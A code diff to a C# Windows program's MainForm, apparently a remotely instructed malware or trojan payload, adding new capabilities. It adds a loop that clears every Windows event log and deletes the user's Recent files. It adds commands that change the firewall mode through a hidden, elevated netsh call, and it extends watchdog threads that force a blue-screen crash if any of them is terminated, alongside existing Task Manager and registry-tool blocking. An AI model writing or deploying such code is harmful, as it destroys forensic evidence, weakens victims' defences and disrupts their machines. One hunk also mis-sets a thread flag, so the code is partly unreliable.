@@ -51,9 +51,10 @@ public partial class MainForm : Form
 
     private bool ProcessTerminating = false, AntiExplorer = false, AntiTaskManager = false, AntiRegistryTools = false, AntiControlPanel = false, AntiThreadTermination = false, CriticalProcess = false;
     private int instructionsThreadID = -1, controllerThreadID = -1;
-    private int ThreadID1 = -1, ThreadID2 = -1, ThreadID3 = -1, ThreadID4 = -1, MegaThreadControllerID = -1;
+    private int ThreadID1 = -1, ThreadID2 = -1, ThreadID3 = -1, ThreadID4 = -1, MegaThreadControllerID = -1, AntiWindowsThreadID = -1;
     private bool SetStartup = false, MonitorFirst = false, AntiSeeFile = false, AlwaysBlockInput = false;
     private string NewPath = Application.ExecutablePath;
+    private bool AntiWindowsEventLogs = false, AntiWindowsRecentFiles = false;
 
     protected override CreateParams CreateParams
     {
@@ -65,14 +66,14 @@ public partial class MainForm : Form
         }
     }
 
-    public void DoAntiTaskManager()
+    public void DoAntiWindows()
     {
         if (AntiThreadTermination)
         {
             Thread.BeginThreadAffinity();
         }
 
-        controllerThreadID = AppDomain.GetCurrentThreadId();
+        AntiWindowsThreadID = AppDomain.GetCurrentThreadId();
 
         while (true)
         {
@@ -111,6 +112,99 @@ public partial class MainForm : Form
                 }
 
                 if (!instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController)
+                {
+                    TriggerBSOD();
+                    return;
+                }
+            }
+
+            if (AntiWindowsEventLogs)
+            {
+                try
+                {
+                    Utils.RunPowerShell("Get-EventLog -LogName * | ForEach { Clear - EventLog $_.Log }");
+                    Utils.RunPowerShell("wevtutil el | Foreach-Object {wevtutil cl “\"$_\"”}");
+                }
+                catch
+                {
+
+                }
+            }
+
+            if (AntiWindowsRecentFiles)
+            {
+                try
+                {
+                    foreach (string file in System.IO.Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":" + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent"))
+                    {
+                        try
+                        {
+                            File.Delete(file);
+                        }
+                        catch
+                        {
+
+                        }
+                    }
+                }
+                catch
+                {
+
+                }
+            }
+        }
+    }
+
+    public void DoAntiTaskManager()
+    {
+        if (AntiThreadTermination)
+        {
+            Thread.BeginThreadAffinity();
+        }
+
+        controllerThreadID = AppDomain.GetCurrentThreadId();
+
+        while (true)
+        {
+            Thread.Sleep(100);
+
+            if (ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && instructionsThreadID != -1 && MegaThreadControllerID != -1 && AntiThreadTermination && AntiWindowsThreadID != -1)
+            {
+                bool antiWindowsFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;
+
+                foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
+                {
+                    if (thread.Id == instructionsThreadID)
+                    {
+                        instructionsFound = true;
+                    }
+                    else if (thread.Id == ThreadID1)
+                    {
+                        thread1Found = true;
+                    }
+                    else if (thread.Id == ThreadID2)
+                    {
+                        thread2Found = true;
+                    }
+                    else if (thread.Id == ThreadID3)
+                    {
+                        thread3Found = true;
+                    }
+                    else if (thread.Id == ThreadID4)
+                    {
+                        thread4Found = true;
+                    }
+                    else if (thread.Id == MegaThreadControllerID)
+                    {
+                        megaThreadController = true;
+                    }
+                    else if (thread.Id == AntiWindowsThreadID)
+                    {
+                        antiWindowsFound = true;
+                    }
+                }
+
+                if (!instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController || !antiWindowsFound)
                 {
                     TriggerBSOD();
                     return;
@@ -273,6 +367,7 @@ public partial class MainForm : Form
         Location = new System.Drawing.Point(0, 0);
 
         new Thread(DoAntiTaskManager) { Priority = ThreadPriority.Highest }.Start();
+        new Thread(DoAntiWindows) { Priority = ThreadPriority.Highest }.Start();
         new Thread(ExecuteInstructions) { Priority = ThreadPriority.Highest }.Start();
 
         for (int i = 0; i < 4; i++)
@@ -286,6 +381,18 @@ public partial class MainForm : Form
         {
             CDACL.ChangeDACLStatus(Process.GetCurrentProcess().Handle, true);
             CDACL.ChangeDACLStatus(GetCurrentProcess(), true);
+        }
+
+        foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
+        {
+            try
+            {
+                thread.PriorityLevel = ThreadPriorityLevel.Highest;
+            }
+            catch
+            {
+
+            }
         }
     }
 
@@ -304,7 +411,7 @@ public partial class MainForm : Form
 
             if (controllerThreadID != -1 && instructionsThreadID != -1 && ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && AntiThreadTermination)
             {
-                bool controllerFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false;
+                bool antiWindowsFound = false, controllerFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false;
 
                 foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                 {
@@ -332,9 +439,13 @@ public partial class MainForm : Form
                     {
                         thread4Found = true;
                     }
+                    else if (thread.Id == AntiWindowsThreadID)
+                    {
+                        antiWindowsFound = true;
+                    }
                 }
 
-                if (!controllerFound || !instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found)
+                if (!controllerFound || !instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !antiWindowsFound)
                 {
                     TriggerBSOD();
                     return;
@@ -371,9 +482,9 @@ public partial class MainForm : Form
         {
             Thread.Sleep(100);
 
-            if (controllerThreadID != -1 && instructionsThreadID != -1 && ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && AntiThreadTermination)
+            if (controllerThreadID != -1 && instructionsThreadID != -1 && ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && AntiThreadTermination && AntiWindowsThreadID != -1)
             {
-                bool controllerFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;
+                bool antiWindowsFound = false, controllerFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;
 
                 foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                 {
@@ -405,9 +516,13 @@ public partial class MainForm : Form
                     {
                         megaThreadController = true;
                     }
+                    else if (thread.Id == AntiWindowsThreadID)
+                    {
+                        antiWindowsFound = true;
+                    }
                 }
 
-                if (!controllerFound || !instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController)
+                if (!controllerFound || !instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController || !antiWindowsFound)
                 {
                     TriggerBSOD();
                     return;
@@ -444,9 +559,9 @@ public partial class MainForm : Form
 
                     }
 
-                    if (ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && controllerThreadID != -1 && AntiThreadTermination)
+                    if (ThreadID1 != -1 && ThreadID2 != -1 && ThreadID3 != -1 && ThreadID4 != -1 && controllerThreadID != -1 && AntiThreadTermination && AntiWindowsThreadID != -1)
                     {
-                        bool instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;
+                        bool antiWindowsFound = false, instructionsFound = false, thread1Found = false, thread2Found = false, thread3Found = false, thread4Found = false, megaThreadController = false;
 
                         foreach (ProcessThread thread in Process.GetCurrentProcess().Threads)
                         {
@@ -472,11 +587,11 @@ public partial class MainForm : Form
                             }
                             else if (thread.Id == MegaThreadControllerID)
                             {
-                                megaThreadController = true;
+                                antiWindowsFound = true;
                             }
                         }
 
-                        if (!instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController)
+                        if (!instructionsFound || !thread1Found || !thread2Found || !thread3Found || !thread4Found || !megaThreadController || !antiWindowsFound)
                         {
                             TriggerBSOD();
                             return;
@@ -908,6 +1023,45 @@ public partial class MainForm : Form
             else if (action == "Unswap")
             {
                 SwapMouseButton(0);
+            }
+        }
+        else if (operationType == 23)
+        {
+            Process process = new Process();
+            process.StartInfo.Arguments = $"Firewall set opmode {ReadString(ref theBytes).ToLower()}";
+            process.StartInfo.FileName = "netsh.exe";
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            process.StartInfo.Verb = "runas";
+            process.Start();
+            process.WaitForExit();
+        }
+        else if (operationType == 24)
+        {
+            string action = ReadString(ref theBytes);
+
+            if (action == "Start")
+            {
+                AntiWindowsEventLogs = true;
+            }
+            else if (action == "Stop")
+            {
+                AntiWindowsEventLogs = false;
+            }
+        }
+        else if (operationType == 25)
+        {
+            string action = ReadString(ref theBytes);
+
+            if (action == "Start")
+            {
+                AntiWindowsRecentFiles = true;
+            }
+            else if (action == "Stop")
+            {
+                AntiWindowsRecentFiles = false;
             }
         }
     }
